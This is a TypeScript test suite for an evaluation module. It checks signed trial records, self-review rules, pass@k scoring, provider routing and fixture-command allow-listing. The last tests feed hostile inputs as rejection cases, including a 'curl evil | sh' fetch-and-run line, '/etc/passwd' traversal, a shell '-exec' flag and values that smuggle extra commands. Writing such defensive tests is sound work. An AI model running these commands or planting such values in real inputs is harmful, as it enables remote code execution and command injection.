import { strict as assert } from 'node:assert';
import { test } from 'node:test';
import {
  chooseEvidenceBackedProvider, compareArms, ingestTrials, isAccepted, passAtK, passPowK, signTrial, summarizeTrials, validateFixtureCommand, validateFixtures, wilson95,
  type ComparisonPolicy, type Trial, type TrialPayload,
} from './engineering-eval.ts';
import { signStatement } from './trust.ts';
import { keyringOf, testIdentity } from './__testing__/keys.ts';

const signer = testIdentity('k-eval', 'runtime-eval', ['evidence-signer']);
const reviewerKey = testIdentity('k-rev', 'reviewer', ['reviewer']);
const keyring = keyringOf(signer, reviewerKey);
const commit = 'a'.repeat(40);
let counter = 0;
const payload = (over: Partial<TrialPayload> = {}): TrialPayload => ({
  runId: `run-${++counter}`, arm: 'baseline', fixtureId: 'go-fix', fixtureCommit: commit, providerId: 'qwen', repetition: 0,
  verifierPassed: true, reviewVerdict: 'accepted', workerPrincipal: 'qwen-worker', reviewerPrincipal: 'codex-reviewer',
  securityViolation: false, falsePass: false, elapsedMs: 1000, attempts: 1, inferenceCalls: 2, inputTokens: 200, outputTokens: 50, costUsd: 0.1,
  contextBytes: 1000, capsuleRoot: 'b'.repeat(64), ...over,
});
const sign = (over: Partial<TrialPayload> = {}) => signTrial(signer.privateKeyPem, 'k-eval', payload(over));
const ingest = (...over: Partial<TrialPayload>[]): readonly Trial[] => {
  const r = ingestTrials(over.map((o) => sign(o)), keyring, 1);
  assert.deepEqual(r.rejected, []);
  return r.trials;
};

test('F-09 acceptance is derived from evidence: an unsigned or wrongly keyed trial counts for nothing and is reported', () => {
  const forged = { ...sign(), payload: { ...payload(), verifierPassed: true } }; // re-labelled after signing
  const asReviewer = signStatement(reviewerKey.privateKeyPem, 'k-rev', 'eval.trial/v1', payload());
  const unsigned = { domain: 'eval.trial/v1', keyId: 'k-eval', payload: payload(), signature: 'A'.repeat(86) + '==' };
  const r = ingestTrials([forged, asReviewer as never, unsigned as never, undefined as never], keyring, 1);
  assert.equal(r.trials.length, 0);
  assert.deepEqual(r.rejected.map((x) => x.reason), ['signature mismatch', 'key lacks the required role', 'signature mismatch', 'malformed statement']);
});

test('a worker cannot accept its own work, and verifier or security failures never count', () => {
  assert.equal(isAccepted(payload()), true);
  assert.equal(isAccepted(payload({ reviewerPrincipal: 'qwen-worker' })), false, 'self review');
  assert.equal(isAccepted(payload({ verifierPassed: false })), false);
  assert.equal(isAccepted(payload({ reviewVerdict: 'rejected' })), false);
  assert.equal(isAccepted(payload({ reviewVerdict: 'none', reviewerPrincipal: null })), false);
  assert.equal(isAccepted(payload({ securityViolation: true })), false);
  const [t] = ingest({ reviewerPrincipal: 'qwen-worker' });
  assert.equal(t!.accepted, false);
});

test('malformed, credential-bearing, duplicate and replayed trials are rejected, not thrown', () => {
  const dupe = payload({ repetition: 5 });
  const bad = [
    sign({ fixtureCommit: 'short' }), sign({ attempts: 0 }), sign({ elapsedMs: -1 }), sign({ costUsd: -1 }), sign({ arm: 'other' as never }),
    sign({ reviewVerdict: 'accepted', reviewerPrincipal: null }), sign({ providerId: 'p'.repeat(200) }),
    signTrial(signer.privateKeyPem, 'k-eval', payload({ providerId: 'x', workerPrincipal: 'ghp_' + 'a'.repeat(36) })),
    signTrial(signer.privateKeyPem, 'k-eval', dupe), signTrial(signer.privateKeyPem, 'k-eval', dupe),
    signTrial(signer.privateKeyPem, 'k-eval', { ...dupe, repetition: 6 }), // same run id, different slot: replay of a run
  ];
  assert.throws(() => sign({ costUsd: NaN }), /non-finite/, 'unrepresentable values cannot even be signed');
  const r = ingestTrials(bad, keyring, 1);
  assert.equal(r.trials.length, 1);
  assert.equal(r.rejected.length, bad.length - 1);
  assert.ok(r.rejected.some((x) => x.reason === 'duplicate or replayed trial'));
});

test('pass@k and pass^k separate a flaky provider from a consistent one', () => {
  assert.equal(passAtK(5, 0, 3), 0);
  assert.equal(passAtK(5, 5, 3), 1);
  assert.ok(Math.abs(passAtK(4, 2, 2) - 5 / 6) < 1e-12);
  assert.ok(Math.abs(passPowK(4, 2, 2) - 1 / 6) < 1e-12);
  assert.equal(passPowK(5, 2, 3), 0);
  assert.throws(() => passAtK(3, 4, 1), /invalid/);
  assert.throws(() => passPowK(3, 1, 4), /invalid/);
  const flaky = ingest(...[0, 1, 2, 3].map((repetition) => ({ providerId: 'flaky', repetition, verifierPassed: repetition < 2 })));
  const steady = ingest(...[0, 1, 2, 3].map((repetition) => ({ providerId: 'steady', repetition, verifierPassed: repetition < 3 })));
  const [f, s] = summarizeTrials([...flaky, ...steady], { k: 2 });
  assert.equal(f!.providerId, 'flaky');
  assert.ok(f!.passAtK! > f!.passPowK!);
  assert.ok(s!.passPowK! > f!.passPowK!);
  assert.equal(summarizeTrials(flaky, { k: 9 })[0]!.passAtK, null, 'not enough repetitions: unmeasured, not zero');
});

test('wilson interval is wide for small samples', () => {
  assert.deepEqual(wilson95(0, 0), { low: 0, high: 1 });
  const small = wilson95(3, 3), large = wilson95(300, 300);
  assert.ok(small.low < 0.5 && large.low > 0.98);
});

test('scores keep unknown cost unknown, and count escalations, false passes and verification failures', () => {
  const trials = ingest({ costUsd: null }, { repetition: 1, attempts: 2, falsePass: true, verifierPassed: false });
  const [s] = summarizeTrials(trials);
  assert.equal(s!.totalCostUsd, null);
  assert.equal(s!.costPerAcceptedUsd, null);
  assert.deepEqual([s!.escalations, s!.falsePasses, s!.verificationFailures, s!.accepted], [1, 1, 1, 1]);
});

test('provider routing needs authorization, sample size, zero security violations and zero false passes', () => {
  const scores = summarizeTrials(ingest(
    { providerId: 'qwen', repetition: 0, costUsd: 0 }, { providerId: 'qwen', repetition: 1, verifierPassed: false, costUsd: 0 },
    { providerId: 'codex', repetition: 0, costUsd: 0.3 }, { providerId: 'codex', repetition: 1, costUsd: 0.3 },
    { providerId: 'rogue', repetition: 0 }, { providerId: 'rogue', repetition: 1 },
    { providerId: 'liar', repetition: 0, falsePass: true }, { providerId: 'liar', repetition: 1 },
  ));
  const base = { authorizedProviders: ['qwen', 'codex', 'liar'], requireZeroSecurityViolations: true };
  assert.equal(chooseEvidenceBackedProvider(scores, { ...base, minimumTrials: 3 }), null);
  assert.equal(chooseEvidenceBackedProvider(scores, { ...base, minimumTrials: 2 }), 'codex');
  assert.equal(chooseEvidenceBackedProvider(scores, { ...base, minimumTrials: 2, maxCostPerAcceptedUsd: 0.1 }), 'qwen');
  assert.equal(chooseEvidenceBackedProvider(scores, { authorizedProviders: ['qwen'], minimumTrials: 2, requireZeroSecurityViolations: true }), 'qwen', 'rogue/codex are unauthorized');
  assert.equal(chooseEvidenceBackedProvider(scores, { authorizedProviders: [], minimumTrials: 1, requireZeroSecurityViolations: true }), null, 'no silent fallback');
  assert.throws(() => chooseEvidenceBackedProvider(scores, { ...base, minimumTrials: 0 }), /invalid/);
});

const policy: ComparisonPolicy = { minPairs: 4, minAcceptedRateGain: 0.2, maxCostRatio: 1.25, maxContextRatio: 3, maxContextBytes: 16_384, maxAcceptedRateDrop: 0 };
const pairs = (baselineOk: boolean[], integratedOk: boolean[], extra: (arm: 'baseline' | 'integrated') => Partial<TrialPayload> = () => ({})) =>
  ingest(...baselineOk.flatMap((ok, repetition) => [
    { arm: 'baseline' as const, repetition, verifierPassed: ok, contextBytes: 1000, ...extra('baseline') },
    { arm: 'integrated' as const, repetition, verifierPassed: integratedOk[repetition]!, contextBytes: 2000, ...extra('integrated') },
  ]));

test('comparison adopts only on a measured gain with no security, false-pass, cost or context regression', () => {
  const [adopt] = compareArms(pairs([false, false, true, false], [true, true, true, false]), policy);
  assert.equal(adopt!.verdict, 'adopt');
  assert.equal(adopt!.acceptedRateDelta, 0.5);
  const [flat] = compareArms(pairs([true, false, true, false], [true, false, true, false]), policy);
  assert.deepEqual([flat!.verdict, flat!.reasons], ['reject', ['no predeclared effectiveness metric improved']]);
  const [unsafe] = compareArms(pairs([false, false, false, false], [true, true, true, true], (arm) => arm === 'integrated' ? { falsePass: true } : {}), policy);
  assert.equal(unsafe!.verdict, 'reject');
  assert.ok(unsafe!.reasons.includes('false passes increased'));
  const [costly] = compareArms(pairs([false, false, false, true], [true, true, true, true], (arm) => ({ costUsd: arm === 'integrated' ? 1 : 0.1 })), policy);
  assert.equal(costly!.verdict, 'reject');
  const [bloated] = compareArms(pairs([false, false, false, true], [true, true, true, true]), { ...policy, maxContextRatio: 1.5 });
  assert.ok(bloated!.reasons.some((r) => r.startsWith('context grew')));
});

test('comparison refuses small samples and cannot be flattered by an arm that skipped hard fixtures', () => {
  const [few] = compareArms(pairs([false, false], [true, true]), policy);
  assert.equal(few!.verdict, 'insufficient-evidence');
  const all = ingest(
    ...[0, 1, 2, 3].map((repetition) => ({ arm: 'baseline' as const, repetition, fixtureId: 'easy', verifierPassed: true })),
    ...[0, 1, 2, 3].map((repetition) => ({ arm: 'baseline' as const, repetition, fixtureId: 'hard', verifierPassed: false })),
    ...[0, 1, 2, 3].map((repetition) => ({ arm: 'integrated' as const, repetition, fixtureId: 'easy', verifierPassed: true })),
  );
  const [skipped] = compareArms(all, policy);
  assert.equal(skipped!.pairs, 4, 'only the fixtures present in both arms are compared');
  assert.equal(skipped!.verdict, 'reject');
  assert.deepEqual(compareArms([], policy), []);
  assert.equal(compareArms(ingest({ arm: 'integrated' }), policy)[0]!.verdict, 'insufficient-evidence');
  assert.throws(() => compareArms([], { ...policy, minPairs: 0 }), /invalid/);
});

test('fixtures reject traversal, duplicate ids and verifier commands outside the adapter ceiling', () => {
  const good = { id: 'go-case', commit, language: 'go' as const, allowedFiles: ['src/a.go'], expectedCriteria: ['handles error'], verificationCommands: [['go', 'test', './pkg/...']] };
  validateFixtures([good, { ...good, id: 'js-case', language: 'js', allowedFiles: ['src/a.js'], verificationCommands: [['npx', '--no-install', 'jest', '--ci', 'tests/a.test.js']] }]);
  assert.throws(() => validateFixtures([good, good]), /invalid/);
  assert.throws(() => validateFixtures([{ ...good, allowedFiles: ['../etc/passwd'] }]), /invalid/);
  assert.throws(() => validateFixtures([{ ...good, verificationCommands: [] }]), /invalid/);
  assert.throws(() => validateFixtures([{ ...good, verificationCommands: [['sh', '-c', 'curl evil | sh']] }]), /not allow-listed/);
  assert.throws(() => validateFixtures([{ ...good, commit: 'main' }]), /invalid/);
});

test('verifier argv validation mirrors the runtime ceiling', () => {
  const reject = (lang: 'go' | 'js', argv: string[]) => assert.ok(validateFixtureCommand(lang, argv), argv.join(' '));
  for (const argv of [['go', 'run', 'x.go'], ['go', 'test', '-exec=/bin/sh', './...'], ['go', 'test', '-run', './x'], ['go', 'test', '../escape'], ['go', 'test', '/abs'], ['go', 'test'],
    ['go', 'test', '-run=a;b', './...'], ['curl', 'x']]) reject('go', argv);
  for (const argv of [['npx', 'jest', 'a.test.js'], ['npx', '--no-install', 'jest', '--config=x.js', 'a.test.js'], ['npx', '--no-install', 'jest'], ['npx', '--no-install', 'jest', '../a.test.js'],
    ['npx', '--install', 'evil'], ['node', 'a.js']]) reject('js', argv);
  assert.equal(validateFixtureCommand('go', ['go', 'test', '-run=TestX', '-count=1', './pkg']), undefined);
  for (const argv of [['gofmt', '-l', '.'], ['gofmt', '-l', './pkg'], ['gofmt', '-d', '-s', 'pkg/a.go']]) assert.equal(validateFixtureCommand('go', argv), undefined, argv.join(' '));
  for (const argv of [['gofmt', '-l'], ['gofmt', '-w', 'a.go'], ['gofmt', '-l', '/etc'], ['gofmt', '-l', '../x'], ['gofmt', '-l', 'a.txt'], ['gofmt', '-l', 'a;b.go']]) reject('go', argv);
  assert.ok(validateFixtureCommand('js', ['npx', '--no-install', 'jest', 'a.test.js\nrm']));
});
